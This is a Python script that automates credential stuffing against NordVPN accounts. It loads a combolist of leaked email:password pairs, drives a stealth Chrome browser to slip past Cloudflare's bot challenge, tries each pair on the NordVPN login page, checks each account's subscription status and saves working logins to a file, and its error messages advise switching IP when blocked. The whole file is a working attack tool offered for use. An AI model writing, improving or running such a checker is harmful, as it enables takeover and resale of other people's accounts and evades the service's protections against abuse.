import time
import os
import undetected_chromedriver as stealthdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import WebDriverException
import sys

from pathlib import Path
from selenium.webdriver.common.by import By
from header import title



user = []
password = []
retries = 0
counter = 0

if getattr(sys, 'frozen', False):# and hasattr(sys, 'MEIPASS'):
    user_directory = str(Path(sys.executable).parent) + "\\nord.txt"
    save_directory = str(Path(sys.executable).parent) + "\\valid_accounts"
    os.makedirs(save_directory, exist_ok=True)
    save_file = "\\valid_accounts.txt"
else:
    user_directory = str(Path(__file__).parent) + "/nord.txt"
    user_directory = str(Path(__file__).parent)  + "/nord.txt"
    save_directory = str(Path(__file__).parent) + "/valid_accounts"
    os.makedirs(save_directory, exist_ok=True)
    save_file = "/valid_accounts.txt"
try:
    os.remove(save_directory + save_file)
except FileNotFoundError:
    pass
try:
    with open (user_directory, 'r') as combos:
        for i in combos.readlines():
            user.append(i.split(":")[0])
            password.append(i.split(":")[1].split(" ")[0].strip())
except FileNotFoundError as e:
    print("No combolist found in: " + user_directory + "\nPlease add 'nord.txt' and try again.\nPress Enter to end.")
    input()
    exit()

index = 0
title()
while index != len(user):
    try:
        if retries > 5:
            print("\n\nToo many errors. \n\nUndetected Chromedriver can't bypass Cloudflare if you are using a "
                  "blacklisted datacenter IP address. If this is the case, try changing your IP and try again. "
                  "\nEnding.")
            exit()
        with open(save_directory + save_file, 'a') as accounts:
            browser_options = stealthdriver.ChromeOptions()
            browser_options.add_argument(
                'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/116.0.0.0 Safari/537.36')
            #browser_options.add_argument("--auto-open-devtools-for-tabs")
            # browser_options.add_argument('--headless=new')
            browser = stealthdriver.Chrome(version_main=102)
            page = 'https://www.nordvpn.com/'
            browser.set_window_size(800, 200)
            browser.get(page)
            print('\rTrying Combo {} out of {}'.format(index + 1, len(user)), end='')
            continue_button = browser.find_element(By.XPATH, '//*[@id="js-HeaderV3__mini-nav"]/li[3]/a')
            continue_button.click()
            time.sleep(3)
            browser.switch_to.window(browser.window_handles[1])
            time.sleep(1)
            start = time.time()
            while True:
                if browser.find_elements(By.XPATH, '/html/body/div/div/div/main/form/fieldset/div/span/input'):
                    break
                if time.time() - start > 30 and counter == 0:
                    print("\n\nCloudflare Time Out")
                    exit()
                if counter > 5:
                    print("\n\nCould not bypass Cloudflare IUAM."
                          "\nEnding.")
                    exit()
                if browser.find_elements(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/iframe'):
                    iframe = browser.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/iframe')
                    browser.switch_to.frame(iframe)
                    time.sleep(1)
                    if browser.find_elements(By.CSS_SELECTOR, 'input[type=checkbox]'):
                        verification = browser.find_element(By.CSS_SELECTOR, 'input[type=checkbox]')
                        verification.click()
                        counter += 1
                browser.switch_to.default_content()
                time.sleep(5)
            email_box = browser.find_element(By.XPATH, '/html/body/div/div/div/main/form/fieldset/div/span/input')
            continue_button = browser.find_element(By.XPATH, '//*[@id="app"]/div/div/main/form/fieldset/button')
            email_box.send_keys(user[index])
            continue_button.click()
            time.sleep(5)
            password_box = browser.find_element(By.XPATH, 'html/body/div/div/div/main/form/fieldset/div[3]/span/input')
            login_button = browser.find_element(By.XPATH, 'html/body/div/div/div/main/form/fieldset/button')
            password_box.send_keys(password[index])
            login_button.click()
            time.sleep(4)
            if 'https://my.nordaccount.com/dashboard/' in browser.current_url:
                subscription_page = 'https://my.nordaccount.com/billing/my-subscriptions/'
                browser.get(subscription_page)
                time.sleep(4)
                if browser.find_elements(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p'):
                    no_sub = browser.find_element(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p').text
                    if 'No active subscriptions' in no_sub:
                        print(" | {}:{} ---> No Active Subscription".format(user[index], password[index]))
                if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
                    active_or_expired = browser.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div').text
                    if 'Active' in active_or_expired:
                        print(" | {}:{} ---> Success!".format(user[index], password[index]))
                        accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
                    else:
                        print(" | {}:{} ---> Expired!".format(user[index], password[index]))
            else:
                print(" | {}:{} ---> Account not working".format(user[index], password[index]))
            browser.quit()
            index += 1
            retries = 0
    except NoSuchElementException as b:
        print(" | Error: No Such Element - Retrying")
        retries += 1
        browser.quit()
    except WebDriverException as e:
        print(" | Error: Web Driver Exception - Retrying")
        retries += 1
        browser.quit()

